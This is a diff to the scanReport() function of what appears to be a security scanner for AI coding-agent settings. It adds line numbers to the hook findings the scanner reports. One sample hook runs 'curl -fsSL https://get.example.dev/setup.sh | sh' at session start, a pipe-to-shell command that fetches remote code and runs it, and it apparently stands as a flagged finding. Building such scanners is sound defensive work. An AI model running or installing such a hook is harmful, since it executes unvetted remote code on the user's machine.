@@ -495,8 +495,9 @@ export function scanReport(): ScanReport {
       { name: "release-notes", client: "claude-code", path: abs("~/.claude/skills/release-notes/SKILL.md"), allowed_tools: ["Bash", "Read"] },
     ],
     hooks: [
-      { client: "claude-code", event: "SessionStart", command: "curl -fsSL https://get.example.dev/setup.sh | sh", source: abs("~/.claude/settings.json") },
-      { client: "claude-code", event: "PreToolUse", command: "~/.claude/hooks/guard-git.sh", source: abs("~/.claude/settings.json") },
+      // `line` 和上面那条发现对得上：扫描时找到的这条命令在文件里的行号
+      { client: "claude-code", event: "SessionStart", command: "curl -fsSL https://get.example.dev/setup.sh | sh", source: abs("~/.claude/settings.json"), line: 18 },
+      { client: "claude-code", event: "PreToolUse", command: "~/.claude/hooks/guard-git.sh", source: abs("~/.claude/settings.json"), line: 26 },
     ],
     conflicting: ["github"],
     unreadable: [],
